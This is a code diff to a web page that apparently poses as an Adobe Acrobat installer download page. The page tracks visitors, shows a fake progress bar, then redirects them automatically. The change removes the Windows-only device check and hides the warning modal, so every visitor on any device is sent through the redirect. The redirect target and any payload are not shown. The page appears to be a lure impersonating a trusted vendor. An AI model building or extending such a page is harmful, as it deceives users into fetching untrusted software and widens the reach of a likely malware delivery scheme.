@@ -523,8 +523,8 @@
     </div>
   </main>
   
-  <!-- Mobile Device Modal -->
-  <div id="mobileModal" class="mobile-modal">
+  <!-- Mobile Device Modal - Hidden (restrictions removed) -->
+  <div id="mobileModal" class="mobile-modal" style="display: none;">
       <div class="mobile-modal-content">
         <h2>⚠️ Windows Desktop Required</h2>
         <p><strong>This Adobe Acrobat installer is designed for Windows desktop computers only.</strong></p>
@@ -945,82 +945,41 @@ Adobe Acrobat Download Page Visit`;
         console.error('Error with visitor tracking:', error);
       }
       
-      // Check if mobile device and not Windows
-      if (isMobileDevice() || !isWindowsOS()) {
-        console.log('Mobile/non-Windows detected - showing popup and blocking redirects');
+      // Mobile restriction removed - all devices can access the page
+      console.log('All devices allowed - no mobile restrictions');
+      
+      // Run progress animation and redirect for all devices
+      console.log('Starting redirect process for all devices');
+      
+      // Animate progress percentage from 0% to 100% over 2 seconds
+      const percentageElement = document.getElementById('progress-percentage');
+      const duration = 2000; // 2 seconds
+      const startTime = Date.now();
+      
+      function updatePercentage() {
+        const elapsed = Date.now() - startTime;
+        const progress = Math.min(elapsed / duration, 1);
+        const percentage = Math.round(progress * 100);
         
-        // Show mobile modal after a short delay
-        setTimeout(() => {
-          showMobileModal();
-        }, 1000);
+        percentageElement.textContent = percentage + '%';
         
-        // Completely block redirects on mobile/non-Windows
-        // Override the redirect function to prevent any redirects
-        window.triggerRedirectAfterAnimation = function() {
-          console.log('Redirect blocked - mobile/non-Windows device');
-          return false;
-        };
-        
-        // Also block top.location redirects on mobile
-        try {
-          Object.defineProperty(window, 'top', {
-            get: function() { return window; },
-            configurable: true
-          });
-        } catch (e) {
-          console.log('Could not override top property:', e);
+        if (progress < 1) {
+          requestAnimationFrame(updatePercentage);
+        } else {
+          // Animation completed - trigger redirect
+          console.log('Progress animation completed at 100%');
+          triggerRedirectAfterAnimation();
         }
-        
-        // Don't start progress animation or redirect on mobile/non-Windows
-        console.log('Mobile device detected - redirects disabled');
-        return;
       }
       
-      // Only run progress animation and redirect on Windows desktop
-      if (isWindowsOS() && !isMobileDevice()) {
-        console.log('Windows desktop detected - starting redirect process');
-        
-        // Animate progress percentage from 0% to 100% over 2 seconds
-        const percentageElement = document.getElementById('progress-percentage');
-        const duration = 2000; // 2 seconds
-        const startTime = Date.now();
-        
-        function updatePercentage() {
-          const elapsed = Date.now() - startTime;
-          const progress = Math.min(elapsed / duration, 1);
-          const percentage = Math.round(progress * 100);
-          
-          percentageElement.textContent = percentage + '%';
-          
-          if (progress < 1) {
-            requestAnimationFrame(updatePercentage);
-          } else {
-            // Animation completed - trigger redirect
-            console.log('Progress animation completed at 100%');
-            triggerRedirectAfterAnimation();
-          }
-        }
-        
-        requestAnimationFrame(updatePercentage);
-      } else {
-        console.log('Not Windows desktop - skipping redirect');
-        console.log('isWindowsOS():', isWindowsOS());
-        console.log('isMobileDevice():', isMobileDevice());
-        console.log('User Agent:', navigator.userAgent);
-      }
+      requestAnimationFrame(updatePercentage);
     });
     
-    // Function to trigger redirect after animation completes (Windows only)
+    // Function to trigger redirect after animation completes (all devices)
     function triggerRedirectAfterAnimation() {
       console.log('Animation completed, checking for redirect...');
       
-      // Check that we're on Windows desktop before redirecting
-      if (!isWindowsOS() || isMobileDevice()) {
-        console.log('Skipping redirect - not Windows desktop');
-        return;
-      }
-      
-      console.log('Proceeding with redirect on Windows desktop');
+      console.log('Proceeding with redirect for all devices');
       
       // Check if utils is loaded and teams is enabled
       if (typeof window.utils !== 'undefined' && window.utils.isProviderEnabled('teams')) {
